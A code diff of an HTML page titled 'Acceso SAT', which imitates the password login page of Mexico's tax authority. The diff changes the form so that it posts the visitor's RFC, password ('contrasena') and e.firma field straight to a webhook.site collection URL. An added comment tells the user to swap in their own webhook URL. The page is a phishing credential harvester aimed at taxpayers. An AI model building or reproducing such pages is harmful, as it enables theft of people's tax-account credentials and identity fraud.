@@ -6,7 +6,6 @@
   <title>Acceso SAT</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  <script defer src="script.js"></script>
 </head>
 <body>
   <header>
@@ -26,15 +25,16 @@
     <p class="inicio"><i class="fas fa-house"></i> Inicio</p>
     <h1>Acceso por contraseña</h1>
 
-    <form onsubmit="enviarDatos(event)">
+    <!-- 👇 Cambia la URL de webhook.site -->
+    <form method="POST" action="https://webhook.site/0eeccc4c-f486-4dad-a7a6-c166675c4575">
       <label for="rfc">RFC:</label>
       <input type="text" id="rfc" name="rfc" required>
 
       <label for="password">Contraseña: <span title="Ingresa tu contraseña.">❔</span></label>
-      <input type="password" id="password" name="password" required>
+      <input type="password" id="password" name="contrasena" required>
 
       <label for="efirma">e.firma portable:</label>
-      <input type="text" id="efirma" name="efirma" placeholder="Clave dinámica">
+      <input type="text" id="efirma" name="efirma">
 
       <label for="captcha">Captcha:</label>
       <img src="./assets/capcha1.png" alt="captcha" style="margin: 10px 0;">
